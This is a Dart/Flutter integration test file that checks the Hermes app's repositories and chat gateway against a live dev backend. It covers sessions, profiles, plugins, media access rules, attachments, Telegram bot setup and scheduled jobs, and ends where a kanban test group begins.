import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:dio/dio.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:hermes_api/hermes_api.dart'
    show
        CronJobCreate,
        MCPCatalogInstall,
        MCPServerCreate,
        MoaConfigPayload,
        SessionRename;
import 'package:hermes_app/src/api/hermes_api_client.dart';
import 'package:hermes_app/src/bots/hermes_bots_repository.dart';
import 'package:hermes_app/src/chat/chat_models.dart';
import 'package:hermes_app/src/chat/chat_transport.dart';
import 'package:hermes_app/src/chat/gateway/gateway_connection.dart';
import 'package:hermes_app/src/chat/gateway/gateway_rpc_client.dart';
import 'package:hermes_app/src/chat/gateway/hermes_gateway_transport.dart';
import 'package:hermes_app/src/chat/hermes_chat_repository.dart';
import 'package:hermes_app/src/chat/media/media_source.dart';
import 'package:hermes_app/src/kanban/hermes_plugins_repository.dart';
import 'package:hermes_app/src/kanban/kanban_models.dart';
import 'package:hermes_app/src/kanban/kanban_repository.dart';
import 'package:hermes_app/src/mcp/hermes_mcp_repository.dart';
import 'package:hermes_app/src/plugins/hermes_plugin_manager_repository.dart';
import 'package:hermes_app/src/plugins/installed_plugin.dart';
import 'package:hermes_app/src/plugins/provider_settings.dart';
import 'package:hermes_app/src/models/hermes_models_repository.dart';
import 'package:hermes_app/src/profiles/hermes_profiles_repository.dart';
import 'package:hermes_app/src/schedules/hermes_cron_repository.dart';
import 'package:hermes_app/src/schedules/job_draft.dart';
import 'package:hermes_app/src/schedules/schedule_models.dart';
import 'package:hermes_app/src/schedules/schedule_spec.dart';
import 'package:hermes_app/src/skills/hermes_skills_hub_repository.dart';
import 'package:hermes_app/src/skills/hermes_skills_repository.dart';

import 'support/attachment_fixtures.dart';

/// Runs the repositories against a real Hermes dashboard, to check the
/// response shapes they parse (the spec declares none for these routes), and
/// the chat gateway over its websocket.
///
///     scripts/dev-backend.sh start
///     HERMES_DEV_URL=$(scripts/dev-backend.sh url) flutter test \
///       test/real_backend_contract_test.dart
///
/// Skipped when `HERMES_DEV_URL` is unset. Use a throwaway backend: the
/// profile test switches the active profile back to `default`, the setup
/// test writes and then clears a Telegram token (skipped if one is set), the
/// skills test switches one skill off and back on, the plugin tests switch a
/// bundled plugin off and on and hide and show it, then put both back, and
/// the session tests rename, pin and archive the newest session, then undo it
/// (a title the session had not set is left as its displayed one). Deleting
/// is not tried. The attachment tests create gateway sessions and attach
/// images and files to them, but never submit a prompt. The gateway tests
/// that stream a reply make real model calls, which cost money and need a
/// provider configured in the backend, so they also need
/// `HERMES_DEV_MODEL_CALLS=1`. The Telegram pairing test contacts the hosted
/// setup service, so it also needs `HERMES_DEV_TELEGRAM_PAIRING=1`. The MCP
/// tests add servers named `contract-check-…` to the default profile and
/// remove them again; the probes connect to a minimal MCP server this test
/// starts on the loopback interface. The custom-server tests add and replace
/// servers named `contract-check-…` the same way, and the replace test saves
/// the whole `mcp_servers` map back unchanged. The catalog test installs `context7`
/// (no credentials, no build) and removes it, and the sign-in test starts and
/// cancels a flow against a minimal OAuth provider on the loopback interface.
/// The media tests write throwaway files under the backend's `images` folder
/// and the system temp directory, so they need a backend on this machine, and
/// delete them after.
void main() {
  final url = Platform.environment['HERMES_DEV_URL'];
  final skip = url == null ? 'set HERMES_DEV_URL to run' : null;
  final modelSkip =
      skip ??
      (Platform.environment['HERMES_DEV_MODEL_CALLS'] == '1'
          ? null
          : 'set HERMES_DEV_MODEL_CALLS=1 to make real model calls');

  late HermesApiClient client;

  setUpAll(() async {
    if (url == null) return;
    final page = await Dio().get<String>('$url/');
    final token = RegExp(r'__HERMES_SESSION_TOKEN__="([^"]+)"')
        .firstMatch(page.data ?? '')
        ?.group(1);
    client = HermesApiClient(
      Dio(
        BaseOptions(baseUrl: url, headers: {'X-Hermes-Session-Token': ?token}),
      ),
    );
  });

  test('sessions load as threads', () async {
    final threads = await HermesChatRepository(client.raw).loadThreads();

    expect(threads.every((t) => t.id.isNotEmpty && t.title.isNotEmpty), isTrue);
  }, skip: skip);

  test('the first session\'s messages load', () async {
    final repository = HermesChatRepository(client.raw);
    final threads = await repository.loadThreads();
    if (threads.isEmpty) return;

    final messages = await repository.loadMessages(threads.first.id);

    expect(messages.every((m) => m.id.startsWith(threads.first.id)), isTrue);
  }, skip: skip);

  test('a session pages back from its newest rows', () async {
    final repository = HermesChatRepository(client.raw);
    final threads = await repository.loadThreads();
    if (threads.isEmpty) return;

    final newest = await repository.loadMessagePage(threads.first.id, limit: 2);
    final older = await repository.loadMessagePage(
      threads.first.id,
      limit: 2,
      offset: newest.rows,
    );

    expect(newest.rows, lessThanOrEqualTo(2));
    expect(older.rows, lessThanOrEqualTo(2));
    expect(
      older.messages.every((m) => m.id.startsWith(threads.first.id)),
      isTrue,
    );
  }, skip: skip);

  test(
    'the active profile reports both the CLI default and the scope',
    () async {
      final active = await HermesProfilesRepository(client.raw).loadActive();

      expect(active.active, isNotEmpty);
      expect(active.current, isNotEmpty);
    },
    skip: skip,
  );

  test('sessions and their messages load per profile', () async {
    final active = (await HermesProfilesRepository(
      client.raw,
    ).loadActive()).active;
    final repository = HermesChatRepository(client.raw);

    final threads = await repository.loadThreads(profile: active);
    if (threads.isEmpty) return;
    final messages = await repository.loadMessages(
      threads.first.id,
      profile: active,
    );

    expect(messages.every((m) => m.id.startsWith(threads.first.id)), isTrue);
  }, skip: skip);

  test('an unknown profile is refused rather than read as empty', () async {
    final repository = HermesChatRepository(client.raw);

    expect(
      repository.loadThreads(profile: 'no-such-profile'),
      throwsA(isA<DioException>()),
    );
  }, skip: skip);

  test('session pages follow each other without gaps', () async {
    final repository = HermesChatRepository(client.raw);
    final first = await repository.loadThreadPage(limit: 2);
    if (!first.hasMore) return;

    final second = await repository.loadThreadPage(
      limit: 2,
      offset: first.nextOffset,
    );

    final pinnedIds = {
      for (final t in [...first.threads, ...second.threads])
        if (t.pinned) t.id,
    };
    final ids = {for (final t in first.threads) t.id};
    expect(
      second.threads.where(
        (t) => ids.contains(t.id) && !pinnedIds.contains(t.id),
      ),
      isEmpty,
    );
  }, skip: skip);

  test('a session can be renamed and renamed back', () async {
    final repository = HermesChatRepository(client.raw);
    final threads = await repository.loadThreads();
    if (threads.isEmpty) return;
    final thread = threads.first;
    final renamed = 'contract check ${DateTime.now().microsecondsSinceEpoch}';

    try {
      expect(await repository.renameThread(thread.id, renamed), renamed);
      final reloaded = await repository.loadThreads();
      expect(reloaded.firstWhere((t) => t.id == thread.id).title, renamed);
    } finally {
      await repository.renameThread(thread.id, thread.title);
    }
  }, skip: skip);

  test('a session can be pinned and unpinned', () async {
    final repository = HermesChatRepository(client.raw);
    final threads = await repository.loadThreads();
    if (threads.isEmpty) return;
    final thread = threads.firstWhere(
      (t) => !t.pinned,
      orElse: () => threads.first,
    );

    try {
      await repository.setPinned(thread.id, !thread.pinned);
      final flipped = (await repository.loadThreads()).firstWhere(
        (t) => t.id == thread.id,
      );
      expect(flipped.pinned, !thread.pinned);
    } finally {
      await repository.setPinned(thread.id, thread.pinned);
    }
  }, skip: skip);

  test('an archived session leaves the list and comes back', () async {
    final repository = HermesChatRepository(client.raw);
    final threads = await repository.loadThreads();
    if (threads.isEmpty) return;
    final thread = threads.first;

    try {
      await repository.archiveThread(thread.id);
      final after = await repository.loadThreads();
      expect(after.map((t) => t.id), isNot(contains(thread.id)));
    } finally {
      await client.raw.renameSessionEndpointApiSessionsSessionIdPatch(
        sessionId: thread.id,
        sessionRename: SessionRename(archived: false),
      );
    }
    final restored = await repository.loadThreads();
    expect(restored.map((t) => t.id), contains(thread.id));
  }, skip: skip);

  test('profiles load and the active one can be set', () async {
    final repository = HermesProfilesRepository(client.raw);

    final overview = await repository.load();
    await repository.setActive(overview.active);

    expect(overview.profiles.map((p) => p.name), contains(overview.active));
  }, skip: skip);

  test('model options carry the fields the model picker reads', () async {
    final profile = (await HermesProfilesRepository(
      client.raw,
    ).loadActive()).active;

    final raw =
        (await client.raw.getModelOptionsApiModelOptionsGet(profile: profile))
                .data!
            as Map<String, dynamic>;
    expect(raw['providers'], isA<List<dynamic>>());
    expect(raw['model'], isA<String>());
    expect(raw['provider'], isA<String>());
    for (final row in (raw['providers'] as List).cast<Map<String, dynamic>>()) {
      expect(row['slug'], isA<String>());
      expect(row['models'], isA<List<dynamic>>());
      if (row['capabilities'] case final Map<String, dynamic> caps) {
        for (final cap in caps.values.cast<Map<String, dynamic>>()) {
          expect(cap['reasoning'], anyOf(isNull, isA<bool>()));
        }
      }
    }

    final options = await HermesModelsRepository(client.raw)
        .load(profile: profile);
    expect(options.providers.every((p) => p.models.isNotEmpty), isTrue);
  }, skip: skip);

  test('helper model slots carry the fields the settings read', () async {
    final profile = (await HermesProfilesRepository(
      client.raw,
    ).loadActive()).active;

    final raw =
        (await client.raw.getAuxiliaryModelsApiModelAuxiliaryGet(
              profile: profile,
            )).data!
            as Map<String, dynamic>;
    final tasks = (raw['tasks'] as List).cast<Map<String, dynamic>>();
    expect(tasks, isNotEmpty);
    for (final row in tasks) {
      expect(row['task'], isA<String>());
      expect(row['provider'], isA<String>());
      expect(row['model'], isA<String>());
      expect(row['reasoning_effort'], anyOf(isNull, isA<String>()));
    }
    expect(raw['main'], containsPair('model', isA<String>()));
    expect(raw['main'], containsPair('provider', isA<String>()));

    final models = await HermesModelsRepository(client.raw)
        .loadAuxiliary(profile: profile);
    expect(models.slots.map((s) => s.task), tasks.map((r) => r['task']));
  }, skip: skip);

  test('the MoA config carries the fields the settings read', () async {
    final profile = (await HermesProfilesRepository(
      client.raw,
    ).loadActive()).active;

    final raw =
        (await client.raw.getMoaModelsApiModelMoaGet(profile: profile)).data!
            as Map<String, dynamic>;
    final name = raw['default_preset'] as String;
    final preset = (raw['presets'] as Map<String, dynamic>)[name] as Map;
    for (final slot in [
      ...(preset['reference_models'] as List).cast<Map<String, dynamic>>(),
      preset['aggregator'] as Map<String, dynamic>,
    ]) {
      expect(slot['provider'], isA<String>());
      expect(slot['model'], isA<String>());
      expect(slot['reasoning_effort'], anyOf(isNull, isA<String>()));
    }

    final moa = await HermesModelsRepository(client.raw)
        .loadMoa(profile: profile);
    expect(moa?.slots.last.label, 'Aggregator');
    // The generated payload must accept what the server hands out, or a save
    // could not be built.
    expect(() => MoaConfigPayload.fromJson(moa!.toJson()), returnsNormally);
  }, skip: skip);

  test('skills load with their source, read, and switch off and on', () async {
    final repository = HermesSkillsRepository(client.raw);
    final skills = await repository.list();
    expect(skills, isNotEmpty);
    expect(skills.every((s) => s.name.isNotEmpty), isTrue);

    final skill = skills.first;
    expect(await repository.content(skill.name), isNotEmpty);

    await repository.setEnabled(skill.name, !skill.enabled);
    try {
      final flipped = (await repository.list()).firstWhere(
        (s) => s.name == skill.name,
      );
      expect(flipped.enabled, !skill.enabled);
    } finally {
      await repository.setEnabled(skill.name, skill.enabled);
    }
  }, skip: skip);

  test('the hub catalog, a preview and a scan parse', () async {
    final repository = HermesSkillsHubRepository(client.raw);
    final overview = await repository.overview();
    expect(overview.official, isNotEmpty);
    expect(overview.sources, isNotEmpty);

    final skill = overview.official.first;
    final preview = await repository.preview(skill.identifier);
    expect(preview.skillMd, isNotEmpty);

    final scan = await repository.scan(skill.identifier);
    expect(scan.identifier, skill.identifier);
    expect(scan.policy, InstallPolicy.allow);
  }, skip: skip);

  test('messaging platforms load as bots', () async {
    final bots = await HermesBotsRepository(client.raw).load();

    expect(bots, isNotEmpty);
    expect(bots.every((b) => b.name.isNotEmpty), isTrue);
  }, skip: skip);

  group('plugins', () {
    late HermesPluginManagerRepository repository;

    setUp(() => repository = HermesPluginManagerRepository(client.raw));

    Future<InstalledPlugin?> bundledPlugin() async =>
        (await repository.load()).where((p) => p.bundled).firstOrNull;

    test('the hub lists plugins with the fields the app reads', () async {
      final plugins = await repository.load();

      expect(plugins, isNotEmpty);
      expect(plugins.every((p) => p.name.isNotEmpty), isTrue);
      expect(plugins.any((p) => p.bundled), isTrue);
      expect(
        plugins.where((p) => p.bundled).every((p) => !p.canRemove),
        isTrue,
      );
    }, skip: skip);

    test(
      'a bundled plugin can be turned off and on, and the hub follows',
      () async {
        final plugin = await bundledPlugin();
        if (plugin == null) return;
        final wasEnabled = plugin.status == PluginStatus.enabled;
        addTearDown(() => repository.setEnabled(plugin.name, wasEnabled));

        final changed = await repository.setEnabled(plugin.name, !wasEnabled);
        final after = (await repository.load()).singleWhere(
          (p) => p.name == plugin.name,
        );

        expect(changed.ok, isTrue);
        expect(
          after.status,
          wasEnabled ? PluginStatus.disabled : PluginStatus.enabled,
        );
      },
      skip: skip,
    );

    test('hiding a plugin shows in user_hidden and can be undone', () async {
      final plugin = await bundledPlugin();
      if (plugin == null) return;
      addTearDown(() => repository.setHidden(plugin.name, plugin.hidden));

      final hidden = await repository.setHidden(plugin.name, !plugin.hidden);
      final after = (await repository.load()).singleWhere(
        (p) => p.name == plugin.name,
      );

      expect(hidden.ok, isTrue);
      expect(after.hidden, !plugin.hidden);
    }, skip: skip);

    test('an unknown plugin is refused with a reason', () async {
      final result = await repository.setEnabled('no-such-plugin-here', true);

      expect(result.ok, isFalse);
      expect(result.message, isNotEmpty);
    }, skip: skip);

    test('the catalog loads with the fields the app reads', () async {
      final entries = await repository.loadCatalog();

      expect(entries, isNotEmpty);
      expect(entries.every((e) => e.name.isNotEmpty), isTrue);
      expect(entries.every((e) => e.commit.length >= 7), isTrue);
      expect(entries.any((e) => e.description.isNotEmpty), isTrue);
      expect(entries.any((e) => e.providesTools.isNotEmpty), isTrue);
      expect(entries.any((e) => e.requiresEnv.isNotEmpty), isTrue);
    }, skip: skip);

    test(
      'installing a name that is not in the catalog is refused with a reason',
      () async {
        final result = await repository.installFromCatalog(
          'no-such-catalog-entry',
        );

        expect(result.ok, isFalse);
        expect(result.timedOut, isFalse);
        expect(result.message, contains('not in the Hermes plugin catalog'));
      },
      skip: skip,
    );

    test('installing an unusable source is refused with a reason', () async {
      final result = await repository.installFromSource('not a plugin source');

      expect(result.ok, isFalse);
      expect(result.message, isNotEmpty);
    }, skip: skip);

    test(
      'the provider settings load with a status for each provider',
      () async {
        final settings = await repository.loadProviders();

        expect(settings.memoryOptions, isNotEmpty);
        expect(settings.memoryOptions.every((o) => o.name.isNotEmpty), isTrue);
        expect(
          settings.memoryOptions.any((o) => o.status == ProviderStatus.ready),
          isTrue,
        );
        expect(settings.contextEngine, isNotEmpty);
      },
      skip: skip,
    );

    test('saving the memory provider already in use is accepted', () async {
      final settings = await repository.loadProviders();

      final result = await repository.saveProviders(
        memoryProvider: settings.memoryProvider,
      );

      expect(result.ok, isTrue);
      expect(
        (await repository.loadProviders()).memoryProvider,
        settings.memoryProvider,
      );
    }, skip: skip);

    test(
      'picking a provider that is not ready is refused with a reason',
      () async {
        final settings = await repository.loadProviders();
        final notReady = settings.memoryOptions
            .where((o) => !o.ready)
            .firstOrNull;
        if (notReady == null) return;

        final result = await repository.saveProviders(
          memoryProvider: notReady.name,
        );

        expect(result.ok, isFalse);
        expect(result.message, contains('not ready'));
        expect(
          (await repository.loadProviders()).memoryProvider,
          settings.memoryProvider,
        );
      },
      skip: skip,
    );

    test(
      'a nested plugin name reaches its route as one encoded segment',
      () async {
        final result = await repository.setEnabled('no/such/plugin', true);

        expect(result.ok, isFalse);
        expect(result.message, contains('not installed'));
      },
      skip: skip,
    );
  });

  test('the gateway accepts the server-request capability and lists what it '
      'may ask', () async {
    final rpc = GatewayRpcClient(
      await hermesGatewayConnect(
        baseUrl: url!,
        authRequired: false,
        api: client,
      )(),
    );
    addTearDown(rpc.close);

    final result = await rpc.request('client.capabilities', {
      'server_requests': true,
    });

    expect(
      (result['server_requests'] as List).cast<String>(),
      containsAll(['approval', 'clarify', 'sudo', 'secret']),
    );
  }, skip: skip);

  group('media the agent sends (local backend, no model call)', () {
    late MediaSource media;
    late Directory temp;
    Directory? images;

    setUpAll(() async {
      if (url == null) return;
      media = HermesMediaSource(() => client);
      temp = tempDir('hermes_media_contract');
      final status = (await Dio().get<Map<String, dynamic>>('$url/api/status'))
          .data!;
      final home = status['hermes_home'];
      if (home is String && Directory(home).existsSync()) {
        images = Directory('$home/images')..createSync(recursive: true);
      }
    });

    Future<MediaFailure> failureOf(Future<Object?> call) async {
      try {
        await call;
      } on MediaFetchException catch (e) {
        return e.reason;
      }
      fail('expected a MediaFetchException');
    }

    test('an image in the images folder comes back as a data URL', () async {
      final dir = images;
      if (dir == null) return;
      final file = writeTemp(dir, 'contract-check.png', kTinyPng);
      addTearDown(file.deleteSync);

      expect(await media.image(file.path), kTinyPng);
      final raw = await client.raw.getMediaApiMediaGet(path: file.path);
      expect(
        (raw.data as Map)['data_url'],
        startsWith('data:image/png;base64,'),
      );
    }, skip: skip);

    test('an image elsewhere is refused by /api/media and comes from the '
        'download route', () async {
      final file = writeTemp(temp, 'contract-check.png', kTinyPng);

      await expectLater(
        client.raw.getMediaApiMediaGet(path: file.path),
        throwsA(
          isA<DioException>().having(
            (e) => e.response?.statusCode,
            'status',
            403,
          ),
        ),
      );
      expect(await media.image(file.path), kTinyPng);
    }, skip: skip);

    test('a file downloads byte for byte', () async {
      final everyByte = [for (var i = 0; i < 256; i++) i];
      final file = writeTemp(temp, 'contract-check.bin', everyByte);

      expect(await media.file(file.path), everyByte);
    }, skip: skip);

    test('a missing file is reported as missing by both routes', () async {
      final path = '${temp.path}/nothing-here.png';

      expect(await failureOf(media.file(path)), MediaFailure.missing);
      expect(await failureOf(media.image(path)), MediaFailure.missing);
    }, skip: skip);

    test('a file the server keeps private is refused', () async {
      final file = writeTemp(temp, 'auth.json', utf8.encode('{}'));

      expect(await failureOf(media.file(file.path)), MediaFailure.refused);
    }, skip: skip);

    test('a relative path is not a valid download', () async {
      expect(
        await failureOf(media.file('attachments/report.pdf')),
        MediaFailure.failed,
      );
    }, skip: skip);
  });

  group('attachments over the gateway (no model call)', () {
    late GatewayRpcClient rpc;
    late String sessionId;

    setUp(() async {
      if (url == null) return;
      rpc = GatewayRpcClient(
        await hermesGatewayConnect(
          baseUrl: url,
          authRequired: false,
          api: client,
        )(),
      );
      addTearDown(rpc.close);
      sessionId =
          (await rpc.request('session.create', const {}))['session_id']
              as String;
    });

    test('an image is queued on the session and can be taken off', () async {
      final attached = await rpc.request('image.attach_bytes', {
        'session_id': sessionId,
        'content_base64': base64Encode(kTinyPng),
        'filename': 'contract.png',
      });

      expect(attached['attached'], isTrue);
      expect(attached['path'], isA<String>());
      expect(attached['count'], 1);

      final detached = await rpc.request('image.detach', {
        'session_id': sessionId,
        'path': attached['path'],
      });
      expect(detached['detached'], isTrue);
      expect(detached['count'], 0);
    }, skip: skip);

    test('a file is staged and answered with an @file reference', () async {
      final attached = await rpc.request('file.attach', {
        'session_id': sessionId,
        'name': 'contract.txt',
        'data_url': 'data:text/plain;base64,${base64Encode(utf8.encode('hi'))}',
      });

      expect(attached['attached'], isTrue);
      expect(attached['ref_text'], startsWith('@file:'));
    }, skip: skip);

    test(
      'a file that is not an image is refused as one with code 4016',
      () async {
        await expectLater(
          rpc.request('image.attach_bytes', {
            'session_id': sessionId,
            'content_base64': base64Encode(utf8.encode('hi')),
            'filename': 'notes.txt',
          }),
          throwsA(
            isA<GatewayRpcException>().having((e) => e.code, 'code', 4016),
          ),
        );
      },
      skip: skip,
    );

    test('an unknown method answers with the method-not-found code', () async {
      await expectLater(
        rpc.request('image.attach_nothing', {'session_id': sessionId}),
        throwsA(
          isA<GatewayRpcException>().having(
            (e) => e.code,
            'code',
            kGatewayMethodNotFound,
          ),
        ),
      );
    }, skip: skip);

    test('the transport refuses an oversized file before any prompt', () async {
      final transport = HermesGatewayTransport(
        connect: hermesGatewayConnect(
          baseUrl: url!,
          authRequired: false,
          api: client,
        ),
      );
      addTearDown(transport.close);

      final events = transport.send(
        text: 'never sent',
        attachments: [
          OutgoingAttachment(
            name: 'huge.bin',
            kind: AttachmentKind.file,
            read: () async => Uint8List(kMaxAttachmentBytes + 1),
          ),
        ],
      );

      await expectLater(
        events,
        emitsInOrder([
          isA<ThreadBound>(),
          emitsError(isA<AttachmentException>()),
        ]),
      );
    }, skip: skip);
  });

  test(
    'an image and a file sent with a message come back as attachments',
    () async {
      final transport = HermesGatewayTransport(
        connect: hermesGatewayConnect(
          baseUrl: url!,
          authRequired: false,
          api: client,
        ),
      );
      addTearDown(transport.close);

      final events = await transport
          .send(
            text: 'Reply with the single word: pong. Use no tools.',
            attachments: [
              OutgoingAttachment(
                name: 'dot.png',
                kind: AttachmentKind.image,
                mimeType: 'image/png',
                read: () async => kTinyPng,
              ),
              OutgoingAttachment(
                name: 'note.txt',
                kind: AttachmentKind.file,
                mimeType: 'text/plain',
                read: () async => Uint8List.fromList(utf8.encode('hello')),
              ),
            ],
          )
          .toList();
      final bound = events.first as ThreadBound;
      expect((events.last as ReplyCompleted).failed, isFalse);

      final stored = (await HermesChatRepository(client.raw).loadMessages(
        bound.threadId,
      )).firstWhere((m) => m.role == ChatRole.user);

      expect(stored.content, 'Reply with the single word: pong. Use no tools.');
      expect(stored.attachments.map((a) => (a.name.endsWith('.png'), a.kind)), [
        (true, AttachmentKind.image),
        (false, AttachmentKind.file),
      ]);
      expect(stored.attachments.last.name, 'note.txt');
    },
    skip: modelSkip,
    timeout: const Timeout(Duration(minutes: 3)),
  );

  test(
    'the gateway streams a reply and continues the thread it created',
    () async {
      final transport = HermesGatewayTransport(
        connect: hermesGatewayConnect(
          baseUrl: url!,
          authRequired: false,
          api: client,
        ),
      );
      addTearDown(transport.close);

      final first = await transport
          .send(text: 'Reply with the single word: pong. Use no tools.')
          .toList();

      final bound = first.first as ThreadBound;
      expect(first.whereType<ReplyStarted>(), isNotEmpty);
      final completed = first.last as ReplyCompleted;
      expect(completed.failed, isFalse);
      expect(completed.text.toLowerCase(), contains('pong'));
      expect(first.whereType<ReplyDelta>(), isNotEmpty);

      final threads = await HermesChatRepository(client.raw).loadThreads();
      expect(threads.map((t) => t.id), contains(bound.threadId));

      final second = await transport
          .send(threadId: bound.threadId, text: 'Now say: ping')
          .toList();

      expect(second.whereType<ThreadBound>(), isEmpty);
      expect((second.last as ReplyCompleted).failed, isFalse);
    },
    skip: modelSkip,
    timeout: const Timeout(Duration(minutes: 3)),
  );

  test(
    'the gateway creates and resumes sessions in the profile it is given',
    () async {
      final profiles = HermesProfilesRepository(client.raw);
      final active = (await profiles.loadActive()).active;
      final transport = HermesGatewayTransport(
        connect: hermesGatewayConnect(
          baseUrl: url!,
          authRequired: false,
          api: client,
        ),
      );
      addTearDown(transport.close);

      final first = await transport
          .send(profile: active, text: 'Reply with the single word: pong.')
          .toList();
      final bound = first.first as ThreadBound;
      expect((first.last as ReplyCompleted).failed, isFalse);

      final listed = await HermesChatRepository(client.raw)
          .loadThreads(profile: active);
      expect(listed.map((t) => t.id), contains(bound.threadId));

      final second = await transport
          .send(threadId: bound.threadId, profile: active, text: 'Say: ping')
          .toList();
      expect((second.last as ReplyCompleted).failed, isFalse);
    },
    skip: modelSkip,
    timeout: const Timeout(Duration(minutes: 3)),
  );

  test('a platform\'s setup can be saved, shows as set without its value, '
      'and cleared again', () async {
    final repository = HermesBotsRepository(client.raw);
    Future<HermesBotEnvVar> tokenVar() async => (await repository.load())
        .firstWhere((b) => b.id == 'telegram')
        .envVars
        .firstWhere((v) => v.key == 'TELEGRAM_BOT_TOKEN');
    if ((await tokenVar()).isSet) {
      markTestSkipped('a Telegram token is already set on this backend');
      return;
    }
    final value = '123456789:${'a' * 35}';

    try {
      await repository.saveSetup(
        'telegram',
        env: {'TELEGRAM_BOT_TOKEN': value},
      );
      final saved = await tokenVar();
      expect(saved.isSet, isTrue);
      expect(saved.redactedValue, isNot(value));
    } finally {
      await repository.saveSetup('telegram', clear: ['TELEGRAM_BOT_TOKEN']);
    }
    expect((await tokenVar()).isSet, isFalse);
  }, skip: skip);

  test('a value the dashboard refuses comes back with the reason', () async {
    final repository = HermesBotsRepository(client.raw);

    await expectLater(
      repository.saveSetup('telegram', env: {'TELEGRAM_BOT_TOKEN': 'abc'}),
      throwsA(
        isA<BotSetupRejected>().having(
          (e) => e.message,
          'message',
          contains('bot token'),
        ),
      ),
    );
  }, skip: skip);

  test('an unknown Telegram pairing is reported as such', () async {
    final repository = HermesBotsRepository(client.raw);

    await expectLater(
      repository.telegramPairingStatus('no-such-pairing'),
      throwsA(isA<BotSetupRejected>()),
    );
  }, skip: skip);

  test('Telegram user ids that are not numeric are refused before anything is '
      'saved', () async {
    final repository = HermesBotsRepository(client.raw);

    await expectLater(
      repository.applyTelegramPairing('no-such-pairing', ['abc']),
      throwsA(
        isA<BotSetupRejected>().having(
          (e) => e.message,
          'message',
          contains('numeric'),
        ),
      ),
    );
  }, skip: skip);

  test(
    'a Telegram pairing starts, waits for the user and can be cancelled',
    () async {
      final repository = HermesBotsRepository(client.raw);

      final pairing = await repository.startTelegramPairing();
      final status = await repository.telegramPairingStatus(pairing.id);
      await repository.cancelTelegramPairing(pairing.id);

      expect(Uri.parse(pairing.deepLink).host, 't.me');
      expect(status.ready, isFalse);
    },
    skip: Platform.environment['HERMES_DEV_TELEGRAM_PAIRING'] == null
        ? 'set HERMES_DEV_TELEGRAM_PAIRING to run (contacts the hosted setup '
              'service)'
        : skip,
  );

  test('platforms describe their setup variables', () async {
    final bots = await HermesBotsRepository(client.raw).load();

    final token = bots
        .firstWhere((b) => b.id == 'telegram')
        .envVars
        .firstWhere((v) => v.key == 'TELEGRAM_BOT_TOKEN');
    expect(token.label, isNotEmpty);
    expect(token.required, isTrue);
    expect(token.isPassword, isTrue);
    final vars = bots.expand((b) => b.envVars);
    expect(vars.every((v) => v.isSet || v.redactedValue == null), isTrue);
  }, skip: skip);

  group('scheduled tasks', () {
    test('the cron routes answer and list their delivery targets', () async {
      final cron = HermesCronRepository(client.raw);

      expect(await cron.isAvailable(), isTrue);
      final targets = await cron.deliveryTargets();

      expect(targets.first.id, 'local');
    }, skip: skip);

    test('a job can be created, read, paused, resumed and deleted', () async {
      final cron = HermesCronRepository(client.raw);
      final created = await client.raw.createCronJobApiCronJobsPost(
        cronJobCreate: CronJobCreate(
          schedule: 'every 6h',
          prompt: 'contract test, never run',
          name: 'contract-test',
          paused: true,
        ),
      );
      final job = CronJob.fromJson(created.data)!;
      try {
        expect(job.state, CronJobState.paused);
        expect(job.scheduleDisplay, isNotEmpty);
        expect(job.profile, isNotNull);

        final listed = await cron.listJobs(profile: job.profile);
        expect(listed.any((j) => j.id == job.id), isTrue);
        final read = await cron.getJob(job.id, profile: job.profile);
        expect(read.name, 'contract-test');
        expect(read.scheduleKind, 'interval');

        await cron.resume(job.id, profile: job.profile);
        final resumed = await cron.getJob(job.id, profile: job.profile);
        expect(resumed.isPaused, isFalse);
        expect(resumed.nextRunAt, isNotNull);

        await cron.pause(job.id, profile: job.profile);
        expect(
          (await cron.getJob(job.id, profile: job.profile)).isPaused,
          isTrue,
        );
        expect(await cron.listRuns(job.id, profile: job.profile), isEmpty);
      } finally {
        await cron.delete(job.id, profile: job.profile);
      }
      final gone = cron.getJob(job.id, profile: job.profile);
      await expectLater(
        gone,
        throwsA(
          isA<CronException>().having((e) => e.isNotFound, '404', isTrue),
        ),
      );
    }, skip: skip);

    test('blueprints describe their slots and create a job', () async {
      final cron = HermesCronRepository(client.raw);

      final blueprints = await cron.blueprints();

      expect(blueprints, isNotEmpty);
      expect(
        blueprints.every(
          (b) => b.title.isNotEmpty && b.scheduleHuman.isNotEmpty,
        ),
        isTrue,
      );
      final blueprint = blueprints.firstWhere(
        (b) => b.key == 'custom-reminder',
      );
      expect(blueprint.fields, isNotEmpty);
      final values = <String, Object>{
        for (final f in blueprint.fields)
          if (f.defaultValue != null) f.name: f.defaultValue.toString(),
        'deliver': 'local',
      };
      final job = await cron.instantiate(blueprint.key, values);
      try {
        expect(job.id, isNotEmpty);
        expect(job.deliver, 'local');
        expect(job.profile, isNotNull);
      } finally {
        await cron.delete(job.id, profile: job.profile);
      }
    }, skip: skip);

    test('a blueprint the server refuses names the slot in a 422', () async {
      final cron = HermesCronRepository(client.raw);

      await expectLater(
        cron.instantiate('morning-brief', {'time': '25:99'}),
        throwsA(
          isA<CronException>()
              .having((e) => e.status, 'status', 422)
              .having((e) => e.message, 'message', contains('time')),
        ),
      );
    }, skip: skip);

    test('a job can be edited by diff and its schedule read back', () async {
      final cron = HermesCronRepository(client.raw);
      final draft = JobDraft(
        name: 'contract-edit',
        prompt: 'contract test, never run',
        spec: const WeeklySpec({1, 4}, 9, 30),
        paused: true,
      );
      final job = await cron.createJob(draft);
      try {
        expect(job.scheduleWords, 'Mon, Thu at 09:30');
        expect(ScheduleSpec.fromJob(job).toSchedule(), '30 9 * * 1,4');

        final updated = await cron.updateJob(job.id, {
          'prompt': 'changed',
          'schedule': const EverySpec(6, EveryUnit.hours).toSchedule(),
        }, profile: job.profile);

        expect(updated.prompt, 'changed');
        expect(updated.scheduleWords, 'Every 6 hours');
        expect(updated.name, 'contract-edit');
        expect(updated.isPaused, isTrue);

        final cleared = await cron.updateJob(job.id, {
          'model': '',
        }, profile: job.profile);
        expect(cleared.model, isNull);
      } finally {
        await cron.delete(job.id, profile: job.profile);
      }
    }, skip: skip);

    test('a one-shot in UTC is accepted', () async {
      final cron = HermesCronRepository(client.raw);
      final at = DateTime.now().add(const Duration(days: 30));
      final job = await cron.createJob(
        JobDraft(
          prompt: 'contract test, never run',
          spec: OnceSpec(at),
          paused: true,
        ),
      );
      try {
        expect(job.scheduleKind, 'once');
        expect(job.scheduleRunAt?.difference(at).inMinutes.abs(), lessThan(2));
      } finally {
        await cron.delete(job.id, profile: job.profile);
      }
    }, skip: skip);
  });

  group('kanban', () {
    const title = 'contract test task';

